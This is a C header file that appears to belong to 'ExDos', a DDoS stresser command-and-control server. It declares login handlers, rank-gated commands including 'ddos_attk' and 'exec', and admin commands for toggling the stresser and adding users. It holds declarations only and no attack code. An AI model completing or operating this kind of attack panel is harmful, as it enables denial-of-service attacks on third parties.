#pragma once

#include "../headers/__init__.h"
#include "../headers/user_cnc.h"
#include "../headers/term.h"
#include <clib/String/str.h>
#include <clib/Array/arr.h>
#include <clib/Net/socket.h>

// == [ EVENT HANDLERS ] == (TO KEEP THINGS ORGANIZED, THIS STUFF CAN GO IN ANOTHER FILE 'event.h')
void new_connection_handler(ExDos *x, Client *c);
void successful_login_event(ExDos *x, Client *c);
void valid_cmd_event(ExDos *x, Client *c, str *cmd, Arr *Args);

// == [ NORMAL COMMANDS ] ==
extern const char *HELP_CMD_ALIAS[];
extern const int  HELP_CMD_ARGS;
extern const int  HELP_CMD_RANK_LEVEL;
void help_cmd(ExDos *x, Client *c, str *input, Arr *args);

extern const char *CLEAR_CMD_ALIAS[];
extern const int  CLEAR_CMD_ARGS;
extern const int  CLEAR_CMD_RANK_LEVEL;
void ClearScreenUI(ExDos *x, Client *c, str *input, Arr *args);

extern const char *METHOD_CMD_ALIAS[];
extern const int   METHOD_CMD_ARGS;
extern const int   METHOD_CMD_RANK_LEVEL;
const char *METHODS[3];
void methods_cmd(ExDos *x, Client *c, str *input, Arr *args);

extern const char *ONLINE_CMD_ALIAS[];
extern const int   ONLINE_CMD_ARGS;
extern const int   ONLINE_CMD_RANK_LEVEL;
void online_cmd(ExDos *x, Client *c, str *cmd, Arr *args);

extern const char *EXEC_CMD_ALIAS[];
extern const int   EXEC_CMD_ARGS;
extern const int   EXEC_CMD_RANK_LEVEL;
void exec_cmd(ExDos *x, Client *c, str *cmd, Arr *Args);

extern const int   DDOS_CMD_ARGS;
extern const int   DDOS_CMD_RANK_LEVEL;
void ddos_attk(ExDos *x, Client *c, str *cmd, Arr *Args);

// == [ ACCOUNT COMMANDS ] ==
extern const char *INFO_CMD_ALIAS[];
extern const int   INFO_CMD_ARGS;
extern const int   INFO_CMD_RANK_LEVEL;
void info_cmd(ExDos *x, Client *c, str *cmd, Arr *Args);

extern const char *PASSWD_CMD_ALIAS[];
extern const int   PASSWD_CMD_ARGS;
extern const int   PASSWD_CMD_RANK_LEVEL;
void passwd_cmd(ExDos *x, Client *c, str *cmd, Arr *Args);
static str *prompt_new_passwd(ExDos *x, Client *c, str *cmd, Arr *Args);

// == [ ADMIN COMMANDS ] ==
extern const char *TOGGLE_STRESSER_CMD_ALIAS[];
extern const int   TOGGLE_STRESSER_CMD_ARGS;
extern const int   TOGGLE_STRESSER_CMD_RANK_LEVEL;
void toggle_stresser_cmd(ExDos *x, Client *c, str *cmd, Arr *Args);

extern const char *NEW_USER_CMD_ALIAS[];
extern const int   NEW_USER_CMD_ARGS;
extern const int   NEW_USER_CMD_RANK_LEVEL;
void new_user_cmd(ExDos *x, Client *c, str *cmd, Arr *Args);

// == [ Global Methods ] == (global.c)
void set_ui(ExDos *x, Client *c);
void ClearScreen(Socket *client);
void *title_updater(void **args);